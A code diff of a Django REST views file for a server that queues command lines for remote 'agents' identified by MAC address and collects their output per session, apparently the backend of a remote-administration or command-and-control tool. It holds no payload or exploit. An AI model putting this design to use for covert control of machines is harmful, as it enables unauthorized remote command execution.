@@ -2,15 +2,16 @@ from rest_framework import status
 from rest_framework.decorators import api_view
 from rest_framework.response import Response
 
-from django.http import FileResponse, Http404
+from django.http import FileResponse, Http404, JsonResponse
 from django.utils import timezone
 from django.utils.html import escape
 from django.views.decorators.http import require_GET
 
 from .utils import get_client_ip
-from .models import Agent, Session, Agent_session
+from .models import Agent, Session, Agent_session, Output
 
 import os
+import json
 
 
 @api_view(['POST'])
@@ -26,8 +27,10 @@ def push_command(request, agent_identifier):
         raise Http404("Agent does not exist")
 
     agent = Agent.objects.get(identifier=agent_identifier)
-    agent.push_cmd(request.data.get('cmdline'))
-    return Response(data='', content_type='text/plain')
+
+    info = request.data
+    agent.push_cmd(info.get('cmdline'), int(info.get('session_id')))
+    return JsonResponse({})
 
 
 @api_view(['POST'])
@@ -58,33 +61,39 @@ def get_command(request, agent_identifier):
     agent.save()
 
     # get commands to run
-    cmdline = ''
+    cmd_info = {}
     commands = agent.commands.order_by('timestamp')
     if commands:
-        cmdline = commands[0].cmdline
+        cmd_info['session_id'] = commands[0].session_id
+        cmd_info['cmdline'] = commands[0].cmdline
         commands[0].delete()
-    return Response(data=cmdline, content_type='text/plain')
+    return JsonResponse(cmd_info)
 
 
 @api_view(['POST'])
-def output_command(request, agent_identifier):
+def output_command(request, agent_identifier, session_id):
     """
     Extracts the output from the request, updates the database
 
     :param request:
     :param agent_identifier: The MAC address of the agent
+    :param session_id: The session id of the agent to receive the command
     :return:
     """
     agent = Agent.objects.filter(identifier=agent_identifier)
-    if not agent:
-        raise Http404("Agent does not exist")
+    session = Session.objects.filter(id=session_id)
+    if not agent or not session:
+        raise Http404("Agent or session does not exist")
     else:
         agent = Agent.objects.get(identifier=agent_identifier)
+        output_session = Output()
+        output_session.agent = agent
+        output_session.session_id = session_id
 
     info = request.data.dict()
-    agent.output += escape(info["output"])
-    agent.save()
-    return Response(data='', content_type='text/plain')
+    output_session.output += escape(info["output"])
+    output_session.save()
+    return JsonResponse({})
 
 
 @require_GET
